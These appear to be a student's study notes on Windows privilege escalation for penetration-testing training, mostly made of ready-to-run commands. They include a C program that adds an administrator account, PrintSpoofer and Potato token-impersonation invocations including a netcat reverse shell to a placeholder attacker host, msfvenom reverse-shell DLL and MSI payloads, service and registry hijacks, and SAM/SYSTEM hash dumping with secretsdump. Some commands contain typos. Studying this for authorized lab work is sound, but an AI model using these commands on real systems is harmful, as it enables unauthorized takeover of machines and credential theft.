## Section 1 Enumerating Windows
### Section 16.1.2 Situational Awareness
- Check all installed applications with
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\
CurrentVersion\Uninstall\*" | select displayname
```
- OR 
```
Get-ItemProperty
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
- To display who you are
```
whoami
```
- To display the groups you belong to
```
whoami /groups
```
- Get information on the local user in powershell
```
Get-LocalUser
```
- Get information on local groups in powershell
```
Get-LocalGroup
```
- Get information on a specific group in powershell
```
Get-LocalGroupMember <GROUP_NAME>
```
- Gather information on the system with
```
systeminfo
```
- To list all network interfaces
```
ipconfig /all
```
- To display the routing table
```
route print
```
- To list all active network connections disabling name resolution and see the processID
```
netstat -ano
```
- Identify running processes with
```
Get-Process
```
### 16.1.3 Hidden In Plain View
- Get XAMPP information in powershell
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
- Search for documents under a user in powershell
```
Get-ChildItem -Path C:\Users\<USERNAME> -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
- Run a command as an elevated user
```
runas /user:<USERNAME> cmed
```
### 16.1.4 Information Goldmine Powershell
- Get powershell history with 
```
Get-History
```
- Logs for powershell if turned on can also be found in the event viewer through 
```
Application & Service Logs -> Microsoft -> Windows -> Powershell
```
### 16.1.5 Automated Enumeration
- Download from a URI in powershell with
```
iwr -uri <URL> -Outfile <FILE_NAME>
```
- Automated recon can also use sealtbelt.exe
	- Found in /var/www/windows
	- used with the -group=all option
```
seatbelt.exe -group=all
```

## Section 2 Leveraging Windows Services
### 16.2.1 Service Binary Hijacking
- Get running services with
```
Get-CimInstance -ClassName win32_service | select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- ICACLS permissions
	- F=Full Access
	- M=Modify Access
	- RX=Read and Execute Access
	- R=Read-Only Access
	- W=Write-Only Access
- Check permissions with ICACLS
```
icacls <PATH_TO_BINARY> (ex. C:\xampp\apache\bin\httpd.exe)
```
- Adduser.c file
- Compile it with x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
# Include <stdlib.h>
int main() {
int I;
I = system ("net user <USERNAME> <PASSWORD> /add");
I = system ("net localgroup administrators dave2 /add");
return 0;
}
```
- To stop a service use
```
net stop <SERVICE_NAME>
```
- To check the startmode for a service like MySQL use
```
Get-CimInstance -ClassName win32_sercice | select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
```
- To be able to reboot a computer you need the SeShutDownPrivilege assigned and you check this with 
```
whoami /priv
```
- Reboot a windows machine from the cmdline with 
```
shutdown /r /t 0
```
- Download and execute powerup.ps1 then run
```
Get-ModifiableServiceFile
```
- Restart a service from powershell with
```
Restart-Service <SERVICE_NAME>
```
- See myDLL.cpp in the /offsec folder for an example of a created dll
	- Compile the dll with 
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
### 16.2.3 Unquoted Service Paths 
- find unquoted service paths with 
```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
## Section 3 Abusing Other Windows Components
- In unquoted service paths you have to use the name of the folder as the exe
	- For example if the path is C:\Enterprise Software\Monitoring Solution\Surveillance Apps and the writable directory is Monitoring Solution the name of the exe needs to be Surveillance.exe
		- This is because that is the next part of the path to the executable
### 16.3.1 Scheduled Tasks
- To see scheduled tasks in windows use 
```
schtasks /query /fo LIST /v
```
- check the permissions for writable which means exploitable
```
icacls <PATH>
```
- Wait till the scheduled task is executed then you'll get a shell
### 16.3.2 Using Exploits
- Non-privileged users with assigned privileges such as SeImpersonateProvilege can potentially abuse these privileges to perform privilege escalation attacks 
- This offers the possibility to leverage a token with another security context meaning a user with this privilege can perform operations in the context of another user account under the right circumstances
- By default windows assigns this privilege to members of the following groups 
	- Local Administrators
	- LOCAL SERVICE
	- NETWORK SERVICE
	- SERVIC
- If the usser has SeImpersonatePrivilege enabled you can use printspoofer by itm4n
	- This implements a variation of the printer bug to coerce NT AUTHORITY|SYSTEM into connecting into a controlled named pipe and gives you an interactive shell as NT AUTHORITY|SYSTEM
## Token Impersonation
- command to check 
```
whoami /priv look for IMPERSONATION TRUE
```
### PrintSpoofer
```
printspoofer.exe -i -c powershell.exe
```
```
printspoofer -c "nc.exe <LHOST> <LPORT> -e cmd"
```
### RoguePotato
```
roguepotato.exe -r <ATTACKERIP> -d "shell.exe" -l 9999
```
### GodPotato
```
godpotato.exe -cmd "cmd /c whoami"
```
```
godpotato.exe -cmd "shell.exe"
```
### JuicyPotatoNG
```
juicypotatong.exe -t * -p "shell.exe" -a
```
### SharpEfsPotato
- Writes whoami command to w.log file
```
Sharpefspotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-content C:\temp\w.log"
```
## Service Exploitation
### Binary Hijacking
- Identify service from winpeas
```
icacls <PATH>
```
- F means full permissions and we need to check that we have full access to he folder
- find the binarypath variable with 
```
sc qc <SERVICENAME>
```
- change the path to the reverse shell location with
```
sc config <SERVICE> <OPTION>="<VALUE>"
```
```
sc start <SERVICENAME>
```
### Unquoted Service Path
- display services which are missing quotes that can also be found with winpeas
```
wmic service get name.pathname | findstr /i /v "C:\windows\\" | findstr /i /v """
```
- Check for a writable path with 
```
icacls <PATH>
```
- Insert the payload in a writable location then run
```
sc start <SERVICENAME>
```
### Insecure Service Executables
- In winPEAS output look for a service with the following output
```
File Permissions: Everyone [AllAccess]
```
- Replace the executable in the service folder and start the service
```
sc start <SERVICE>
```
### Weak Registry permissions
- Look for the following in winPEAS services info output to see that you have full access
```
HKLM\System\CurrentControlSet\Services\<SERVICE> (Interactive [FullControl])
```
- check for KEY_ALL_ACCESS
```
accesschk /acceptula -uvwqk <PATH_OF_REGISTRY>
```
- Service information from regedit to identify the variable which holds the executable
```
reg query <REGISTRY_PATH>
```
- Imagepath is the variable here
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
```
net start <SERVICE>
```
### DLL Hijacking
- find missing DLLs using process monitor then identify a specific service which looks suspicious and add a filter
- Then check whether you have write permissions in the directory associated with the service 
- Create the reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENING_PORT> -f dll > filename.dll
```
- copy this to the victim machine and move it into the service assocoated directory (make sure the dll name is similar to missing name)
- Start a listener and restart the service and you should get a shell
### Autoruns
- For checking it will display some information with file-location
```
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
- check that the location is writable (should return FILE_ALL_ACCESS)
```
accesschk.exe \accepteula -wvu "<path>"
```
- Replace the executable with the reverse shell and we need to wait till admin logins then we'll have the shell
### AlwaysInstallElevated
- Checking with the following should return 1 or 0x1
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- create a reverse shell in MSI format
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> --platform windows -f msi > reverse.msi
```
- Execute the installer on the host to get the shell 
```
msiexec /quiet /qn /i reverse.msi
```
### Startup Apps
- Startup applications can be found at 
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```
- Check for writable permissions and move the file over
- The only catch is that the system needs to be restarted
### Insecure GUI Apps
- Check the applications that are running from task manager and obtain the list of applications that are running as privleged user
- Open the privileged user application using the open feature and enter the following
```
file:://c:/windows/system32/cmd.exe
```
### SAM and SYSTEM
- Check the following folders
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old
```
- First got to C:\ then 
```
dir /s SAM
```
```
dir /s SYSTEM
```
- Obtaining hashes from SYSTEM and SAM (always mention local in the command)
```
impacket-secretsdump -system SYSTEM -sam SAM local
```